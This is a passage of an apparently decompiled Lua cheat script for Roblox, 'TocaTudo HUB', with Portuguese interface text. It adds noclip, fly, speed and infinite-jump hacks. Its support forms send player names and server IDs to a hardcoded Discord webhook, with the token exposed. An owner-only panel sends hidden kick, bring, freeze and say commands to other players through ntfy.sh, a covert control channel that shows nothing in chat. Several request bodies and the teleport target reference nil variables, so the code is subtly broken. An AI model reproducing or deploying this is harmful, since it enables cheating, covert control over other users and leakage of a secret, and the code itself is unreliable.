        f3(v79)
        fluent:Notify({
            Title = "Bio Aplicada",
            Content = "Bio: "..v79,
            Duration = 4
        }
)
    end
,
}
)
local addToggle3 = nomeEBio:AddToggle("NameRGBToggleV11", {
    Title = "Nome RGB",
    Default =  true
}
)
addToggle3:OnChanged(function(p37)
    if p37 then
        f7()
    else
        f8()
    end
end
)
local addToggle4 = nomeEBio:AddToggle("BioRGBToggleV11", {
    Title = "Bio RGB",
    Default =  true
}
)
addToggle4:OnChanged(function(p38)
    if p38 then
        f10()
    else
        f9()
    end
end
)
nomeEBio:AddButton({
    Title = "Ativar Rainbow em Ambos",
    Callback = function()
        pcall(function()
            addToggle3:SetValue( true)
        end
)
        pcall(function()
            addToggle4:SetValue( true)
        end
)
        f11()
    end
,
}
)
nomeEBio:AddButton({
    Title = "Desativar Rainbow em Ambos",
    Callback = function()
        pcall(function()
            addToggle3:SetValue( false)
        end
)
        pcall(function()
            addToggle4:SetValue( false)
        end
)
        f12()
    end
,
}
)
local movimento = v53.PlayerTab:AddSection("Movimento")
movimento:AddParagraph({
    Title = "Locomoção",
    Content = "Noclip, Fly, Speed e Pulo"
}
)
movimento:AddToggle("NoclipToggleV4", {
    Title = "Noclip",
    Default =  false
}
):OnChanged(function(p39)
    v45 = p39
    if p39 then
        f31()
        fluent:Notify({
            Title = "Noclip",
            Content = "Noclip ativado!",
            Duration = 3
        }
)
    else
        f34()
        fluent:Notify({
            Title = "Noclip",
            Content = "Noclip desativado.",
            Duration = 3
        }
)
    end
end
)
movimento:AddToggle("FlyToggleV4", {
    Title = "Fly",
    Default =  false
}
):OnChanged(function(p40)
    v47 = p40
    if p40 then
        f33()
        fluent:Notify({
            Title = "Fly",
            Content = "Fly ativado! Use WASD + Espaço/Shift",
            Duration = 4,
        }
)
    else
        f35()
        fluent:Notify({
            Title = "Fly",
            Content = "Fly desativado.",
            Duration = 3
        }
)
    end
end
)
movimento:AddSlider("FlySpeedSliderV4", {
    Title = "Velocidade do Fly",
    Default = 50,
    Min = 10,
    Max = 300,
    Rounding = 0,
    Callback = function(value7)
        v48 = value7
    end
,
}
)
movimento:AddSlider("SpeedSliderV4", {
    Title = "Velocidade (WalkSpeed)",
    Default = 16,
    Min = 16,
    Max = 200,
    Rounding = 0,
    Callback = function(value8)
        walkSpeed2 = value8
        f14(value8)
    end
,
}
)
movimento:AddSlider("JumpSliderV4", {
    Title = "Força do Pulo",
    Default = 50,
    Min = 50,
    Max = 300,
    Rounding = 0,
    Callback = function(value9)
        jumpPower2 = value9
        f26(value9)
    end
,
}
)
movimento:AddButton({
    Title = "Resetar Movimento",
    Callback = function()
        walkSpeed2 = 16
        jumpPower2 = 50
        fluent:Notify({
            Title = "Resetado",
            Content = "Velocidade e pulo padrão.",
            Duration = 3
        }
)
    end
,
}
)
local extras = v53.PlayerTab:AddSection("Extras")
local v80 =  false
local connect3 =  nil
local function f45()
    if connect3 then
        return
    end
    connect3 = userInputService.JumpRequest:Connect(function()
        if v80 and localPlayer.Character then
            local humanoid4 = localPlayer.Character:FindFirstChildOfClass("Humanoid")
            if humanoid4 then
                humanoid4:ChangeState(Enum.HumanoidStateType.Jumping)
            end
        end
    end
)
end
local function f46()
    v80 =  false
    if connect3 then
        connect3:Disconnect()
        connect3 =  nil
    end
end
extras:AddToggle("InfiniteJumpToggleV4", {
    Title = "Pulo Infinito",
    Default =  false
}
):OnChanged(function(p41)
    v80 = p41
    if p41 then
        f45()
        fluent:Notify({
            Title = "Pulo Infinito",
            Content = "Ativado!",
            Duration = 3
        }
)
    else
        f46()
        fluent:Notify({
            Title = "Pulo Infinito",
            Content = "Desativado.",
            Duration = 3
        }
)
    end
end
)
extras:AddToggle("FullbrightToggleV4", {
    Title = "Fullbright",
    Default =  false
}
):OnChanged(function(p42)
    pcall(function()
        if p42 then
            local v81 = game
            v81:GetService("Lighting").Ambient = Color3.fromRGB(255, 255, 255)
            local v83 = game
            v83:GetService("Lighting").OutdoorAmbient = Color3.fromRGB(255, 255, 255)
            local v84 = game
            v84:GetService("Lighting").Brightness = 2
            local v87 = game
            v87:GetService("Lighting").ClockTime = 14
        else
            local v88 = game
            v88:GetService("Lighting").Ambient = Color3.fromRGB(70, 70, 70)
            local v89 = game
            v89:GetService("Lighting").OutdoorAmbient = Color3.fromRGB(128, 128, 128)
            local v91 = game
            v91:GetService("Lighting").Brightness = 1
        end
    end
)
end
)
local sugestO = v53.Support:AddSection("Sugestão")
sugestO:AddParagraph({
    Title = "Enviar uma Sugestão",
    Content = [[
Tem uma ideia? Escreva abaixo.

Cooldown: 10 minutos.]],
}
)
local addParagraph = sugestO:AddParagraph({
    Title = "Status do Cooldown",
    Content = "Você pode enviar uma sugestão agora!",
}
)
local addInput4 = sugestO:AddInput("SuggestionInputV33", {
    Title = "Descrição da Sugestão",
    Default = "",
    Placeholder = "Ex: Seria legal...",
    Numeric =  false,
}
)
local v92 = ""
addInput4:OnChanged(function(p43)
    v92 = p43
end
)
task.spawn(function()
    while task.wait(1) do
        local v94 = f25(v7)
        if v94 > 0 then
            pcall(function()
                addParagraph:SetDesc("Aguarde "..f22(v94).. " para enviar outra sugestão.")
            end
)
        else
            pcall(function()
                addParagraph:SetDesc("Você pode enviar uma sugestão agora!")
            end
)
        end
    end
end
)
sugestO:AddButton({
    Title = "Enviar Sugestão",
    Callback = function()
        local v95 = f25(v7)
        local v96,
        v97,
        v98
        if v95 > 0 then
            fluent:Notify({
                Title = "Cooldown Ativo",
                Content = "Aguarde "..f22(v95).. " para enviar outra sugestão.",
                Duration = 4,
            }
)
            return
        elseif v92 == "" then
            fluent:Notify({
                Title = "Erro",
                Content = "Por favor, descreva sua sugestão antes de enviar!",
                Duration = 3,
            }
)
            return
        else
            local dateTime = DateTime.now()
            v85 = {
                title = "Nova Sugestão - TocaTudo HUB",
                color = 3447003,
                fields = {
                    {
                        name = "Jogador",
                        value = localPlayer.Name.. " (@"..localPlayer.DisplayName.. ")",
                        inline =  true,
                    },
                    {
                        name = "Jogo",
                        value = game.PlaceId.. " - "..game.JobId,
                        inline =  false
                    },
                    {
                        name = "Sugestão",
                        value = v92,
                        inline =  false
                    },
                    {
                        name = "ID da Mensagem",
                        value = "Aguardando envio...",
                        inline =  false
                    },
                },
                footer = {
                    text = "TocaTudo HUB - Sistema de Sugestões"
                },
                timestamp = dateTime:ToIsoDate(),
            }
            v86 = {
                content = "**Nova Sugestão Recebida!**",
                embeds = {
                    v97
                }
            }
            local v99,
            v101 = pcall(function()
                return request({
                    Url = "https://discord.com/api/webhooks/1548335725693505617/myNoPQaOWCv2mzqzV-CdKip6_bX3gLEQB42pB-CxqrLNMyvX9rJLiF7AcWPHI8v-LFa6?wait=true",
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = httpService:JSONEncode(v98),
                }
)
            end
)
            if v99 and v101 then
                id = httpService:JSONDecode(v101).id or "desconhecido"
                pcall(function()
                    local v102 = table.clone(v97)
                    v102.fields[4].value = v96
                    request({
                        Url = "https://discord.com/api/webhooks/1548335725693505617/myNoPQaOWCv2mzqzV-CdKip6_bX3gLEQB42pB-CxqrLNMyvX9rJLiF7AcWPHI8v-LFa6".. "/messages/"..v96,
                        Method = "PATCH",
                        Headers = {
                            ["Content-Type"] = "application/json"
                        },
                        Body = httpService:JSONEncode({
                            embeds = {
                                v102
                            }
                        }
),
                    }
)
                end
)
                f23(v7)
                fluent:Notify({
                    Title = "Sucesso!",
                    Content = "Sua sugestão foi enviada. Obrigado!",
                    Duration = 4,
                }
)
                v82 = ""
                addInput4:SetValue("")
            else
                fluent:Notify({
                    Title = "Erro",
                    Content = "Falha ao enviar. Verifique sua conexão.",
                    Duration = 3,
                }
)
            end
            return
        end
    end
,
}
)
local bugReport = v53.Support:AddSection("Bug Report")
bugReport:AddParagraph({
    Title = "Relatar um Bug",
    Content = [[
Encontrou algum problema? Descreva abaixo.

Cooldown: 10 minutos.]],
}
)
local addParagraph2 = bugReport:AddParagraph({
    Title = "Status do Cooldown",
    Content = "Você pode enviar um bug report agora!",
}
)
local addInput5 = bugReport:AddInput("BugInputV33", {
    Title = "Descrição do Bug",
    Default = "",
    Placeholder = "Ex: Quando clico...",
    Numeric =  false,
}
)
local v103 = ""
addInput5:OnChanged(function(p44)
    v103 = p44
end
)
task.spawn(function()
    while task.wait(1) do
        local v104 = f25(v6)
        if v104 > 0 then
            pcall(function()
                addParagraph2:SetDesc("Aguarde "..f22(v104).. " para enviar outro bug.")
            end
)
        else
            pcall(function()
                addParagraph2:SetDesc("Você pode enviar um bug report agora!")
            end
)
        end
    end
end
)
bugReport:AddButton({
    Title = "Enviar Relatório",
    Callback = function()
        local v106 = f25(v6)
        local v107
        if v106 > 0 then
            fluent:Notify({
                Title = "Cooldown Ativo",
                Content = "Aguarde "..f22(v106).. " para enviar outro bug.",
                Duration = 4,
            }
)
            return
        elseif v103 == "" then
            fluent:Notify({
                Title = "Erro",
                Content = "Por favor, descreva o bug antes de enviar!",
                Duration = 3,
            }
)
            return
        else
            local dateTime2 = DateTime.now()
            v93 = {
                content = "**Novo Bug Report Recebido!**",
                embeds = {
                    {
                        title = "Novo Relatório de Bug - TocaTudo HUB",
                        color = 16711680,
                        fields = {
                            {
                                name = "Jogador",
                                value = localPlayer.Name.. " (@"..localPlayer.DisplayName.. ")",
                                inline =  true,
                            },
                            {
                                name = "Jogo",
                                value = game.PlaceId.. " - "..game.JobId,
                                inline =  false
                            },
                            {
                                name = "Descrição",
                                value = v103,
                                inline =  false
                            },
                            {
                                name = "ID da Mensagem",
                                value = "Aguardando envio...",
                                inline =  false
                            },
                        },
                        footer = {
                            text = "TocaTudo HUB - Bug Report System"
                        },
                        timestamp = dateTime2:ToIsoDate(),
                    },
                },
            }
            local v108,
            v109 = pcall(function()
                return request({
                    Url = "https://discord.com/api/webhooks/1548335725693505617/myNoPQaOWCv2mzqzV-CdKip6_bX3gLEQB42pB-CxqrLNMyvX9rJLiF7AcWPHI8v-LFa6?wait=true",
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = httpService:JSONEncode(v107),
                }
)
            end
)
            if v108 and v109 then
                v566 = httpService:JSONDecode(v109).id
                f23(v6)
                fluent:Notify({
                    Title = "Sucesso!",
                    Content = "Seu relatório foi enviado. Obrigado!",
                    Duration = 4,
                }
)
                v90 = ""
                addInput5:SetValue("")
            else
                fluent:Notify({
                    Title = "Erro",
                    Content = "Falha ao enviar. Verifique sua conexão.",
                    Duration = 3,
                }
)
            end
            return
        end
    end
,
}
)
local servidorDoDiscord = v53.Support:AddSection("Servidor do Discord")
servidorDoDiscord:AddParagraph({
    Title = "Servidor Oficial",
    Content = "Entre no nosso Discord para suporte, novidades e mais!",
}
)
servidorDoDiscord:AddButton({
    Title = "Copiar Link do Discord",
    Callback = function()
        if setclipboard then
            setclipboard("https://discord.gg/Jvrp9t6mnb")
            fluent:Notify({
                Title = "Copiado!",
                Content = "Link do Discord copiado!",
                Duration = 4
            }
)
        else
            fluent:Notify({
                Title = "Erro",
                Content = "setclipboard não suportado.",
                Duration = 3
            }
)
        end
    end
,
}
)
servidorDoDiscord:AddParagraph({
    Title = "Link",
    Content = "https://discord.gg/Jvrp9t6mnb"
}
)
v53.Credits:AddSection("Créditos")
v53.Credits:AddParagraph({
    Title = "Desenvolvedor",
    Content = "isaquemax2030"
}
)
v53.Credits:AddParagraph({
    Title = "Discord",
    Content = "Cebolinha"
}
)
v53.Credits:AddParagraph({
    Title = "Servidor",
    Content = "https://discord.gg/Jvrp9t6mnb"
}
)
local v110, f47, addDropdown, v111, v112, v113, addInput6, v114, addInput7, v115, v116
if v1 and v53.Owner then
    local comandosDeAdmin = v53.Owner:AddSection("Comandos de Admin")
    comandosDeAdmin:AddParagraph({
        Title = "Como funciona",
        Content = "Comandos via ntfy.sh. NADA aparece no chat.",
    }
)
    v110 = {
    }
    function f47()
        v110 = {
        }
        for index4, value10 in ipairs(players:GetPlayers()) do
            if value10 ~= localPlayer then
                table.insert(v110, value10.Name)
            end
        end
        table.insert(v110, "all")
    end
    f47()
    addDropdown = comandosDeAdmin:AddDropdown("PlayerDropdownV32", {
        Title = "Jogador Alvo",
        Values = v110,
        Default = v110[1] or "all",
    }
)
    v111 = v110[1] or "all"
    addDropdown:OnChanged(function(p45)
        v111 = p45
    end
)
    players.PlayerAdded:Connect(function()
        task.wait(1)
        f47()
        pcall(function()
            addDropdown:Refresh(v110,  true)
        end
)
    end
)
    players.PlayerRemoving:Connect(function()
        task.wait(0.5)
        f47()
        pcall(function()
            addDropdown:Refresh(v110,  true)
        end
)
    end
)
    local addDropdown2 = comandosDeAdmin:AddDropdown("CommandDropdownV32", {
        Title = "Comando",
        Values = {
            "bring",
            "kick",
            "say",
            "freeze",
            "unfreeze"
        },
        Default = "kick",
    }
)
    v112 = "kick"
    addDropdown2:OnChanged(function(p46)
        v112 = p46
    end
)
    local addInput8 = comandosDeAdmin:AddInput("ArgsInputV32", {
        Title = "Motivo / Mensagem",
        Default = "",
        Placeholder = "Ex: Motivo do kick",
        Numeric =  false,
    }
)
    v113 = ""
    addInput8:OnChanged(function(p47)
        v113 = p47
    end
)
    comandosDeAdmin:AddButton({
        Title = "Executar Comando",
        Callback = function()
            if v111 == "" then
                fluent:Notify({
                    Title = "Erro",
                    Content = "Selecione um jogador!",
                    Duration = 3
                }
)
                return
            end
            if f20(v112,
            v111,
            v113) then
                fluent:Notify({
                    Title = "Comando Enviado",
                    Content = v112.. " -> "..v111,
                    Duration = 3
                }
)
            else
                fluent:Notify({
                    Title = "Erro",
                    Content = "Falha ao enviar.",
                    Duration = 3
                }
)
            end
        end
,
    }
)
    comandosDeAdmin:AddButton({
        Title = "Testar Conexão",
        Callback = function()
            if f20("ping",
            "all",
            "teste") then
                fluent:Notify({
                    Title = "Ping Enviado",
                    Content = "Clientes vão responder.",
                    Duration = 5,
                }
)
            end
        end
,
    }
)
    local gerenciarRelatRios = v53.Owner:AddSection("Gerenciar Relatórios")
    addInput6 = gerenciarRelatRios:AddInput("MsgIDInputV32", {
        Title = "ID da Mensagem",
        Default = "",
        Placeholder = "Ex: 1234567890",
        Numeric =  true,
    }
)
    v114 = ""
    addInput6:OnChanged(function(p48)
        v114 = p48
    end
)
    gerenciarRelatRios:AddButton({
        Title = "Marcar como Resolvido",
        Callback = function()
            if v114 == "" then
                fluent:Notify({
                    Title = "Erro",
                    Content = "Insira o ID da mensagem!",
                    Duration = 3
                }
)
                return
            end
            local v117 = {
                title = "Resolvido / Analisado",
                color = 65280,
                description = "Marcado como **RESOLVIDO** pelo desenvolvedor.",
                footer = {
                    text = "TocaTudo HUB - Resolvido por isaquemax2030"
                },
                timestamp = DateTime.now():ToIsoDate(),
            }
            if pcall(function()
                return request({
                    Url = "https://discord.com/api/webhooks/1548335725693505617/myNoPQaOWCv2mzqzV-CdKip6_bX3gLEQB42pB-CxqrLNMyvX9rJLiF7AcWPHI8v-LFa6".. "/messages/"..v114,
                    Method = "PATCH",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = httpService:JSONEncode({
                        embeds = {
                            v117
                        }
                    }
),
                }
)
            end
) then
                fluent:Notify({
                    Title = "Resolvido!",
                    Content = "Marcada como resolvida.",
                    Duration = 4
                }
)
                v100 = ""
                addInput6:SetValue("")
            else
                fluent:Notify({
                    Title = "Erro",
                    Content = "Falha ao editar.",
                    Duration = 3
                }
)
            end
        end
,
    }
)
    local entrarEmServidor = v53.Owner:AddSection("Entrar em Servidor")
    addInput7 = entrarEmServidor:AddInput("JobIdInputV10", {
        Title = "JobId do Servidor",
        Default = "",
        Placeholder = "Ex: 8f7d3c4b-...",
        Numeric =  false,
    }
)
    v115 = ""
    addInput7:OnChanged(function(p49)
        v115 = tostring(p49 or "")
    end
)
    local addInput9 = entrarEmServidor:AddInput("PlaceIdInputV10", {
        Title = "PlaceId do Jogo",
        Default = "4924922222",
        Placeholder = "Ex: 4924922222",
        Numeric =  false,
    }
)
    v116 = "4924922222"
    addInput9:OnChanged(function(p50)
        local v118 = tostring(p50 or "")
        if v118 ~= "" then
            v116 = v118
        else
            v116 = "4924922222"
        end
    end
)
    entrarEmServidor:AddButton({
        Title = "Entrar no Servidor",
        Callback = function()
            local getValue2 = v115
            if getValue2 == "" then
                pcall(function()
                    getValue2 = addInput7:GetValue()
                end
)
            end
            local v119
            if not getValue2 or getValue2 == "" then
                fluent:Notify({
                    Title = "Erro",
                    Content = "Cole o JobId antes de clicar!",
                    Duration = 4
                }
)
                return
            else
                getValue2 = getValue2:gsub("%s",
                ""):gsub("`",
                "")
                v105 = tonumber(v116) or tonumber("4924922222")
                fluent:Notify({
                    Title = "Teleportando...",
                    Content = "Servidor: "..getValue2:sub(1,
                    12).. "...",
                    Duration = 5,
                }
)
                task.wait(0.5)
                local v120,
                v121 = pcall(function()
                    teleportService:TeleportToPlaceInstance(v119,
                    getValue2,
                    localPlayer)
                end
)
                if not v120 then
                    fluent:Notify({
                        Title = "Falha no Teleporte",
                        Content = "Erro: "..tostring(v121),
                        Duration = 6,
                    }
)
                end
                return
            end
        end
,
    }
)
    entrarEmServidor:AddButton({
        Title = "Copiar JobId Atual",
        Callback = function()
            if setclipboard then
                setclipboard(game.JobId)
                fluent:Notify({
                    Title = "Copiado!",
                    Content = "JobId: "..game.JobId:sub(1,
                    12).. "...",
                    Duration = 4,
                }
)
            end
        end
,
    }
)
    entrarEmServidor:AddButton({
        Title = "Reentrar no Meu Servidor",
        Callback = function()
            local jobId2 = game.JobId
            fluent:Notify({
                Title = "Reconectando...",
                Content = "Voltando ao servidor.",
                Duration = 4,
            }
)
            task.wait(0.5)
            pcall(function()
                teleportService:TeleportToPlaceInstance(game.PlaceId,
                jobId2,
                localPlayer)
            end
)
        end
,
    }
)
end
local aparNcia = v53.Settings:AddSection("Aparência")
aparNcia:AddParagraph({
    Title = "Tema",
    Content = "Personalize o visual da interface."
}
)
aparNcia:AddDropdown("ThemeDropdownV32", {
    Title = "Tema",
    Values = {
        "Dark",
        "Light",
        "Rose",
        "Aqua",
        "Amethyst"
    },
    Default = "Rose",
}
):OnChanged(function(p51)
end
)
aparNcia:AddToggle("AcrylicToggleV32", {
    Title = "Efeito Acrylic",
    Default =  true
}
):OnChanged(function(acrylic)
    pcall(function()
        window.Options.Acrylic = acrylic
    end
)
end
)
saveManager:SetLibrary(fluent)
saveManager:IgnoreThemeSettings()
saveManager:SetIgnoreIndexes({
}
)
saveManager:SetFolder("TocaTudoHUB")
saveManager:BuildConfigSection(v53.Settings)
interfaceManager:SetLibrary(fluent)
interfaceManager:SetFolder("TocaTudoHUB")
interfaceManager:BuildInterfaceSection(v53.Settings)
window:SelectTab(1)
fluent:Notify({
    Title = "TocaTudo HUB",
    Content = "Interface carregada com sucesso!",
    Duration = 3,
}
)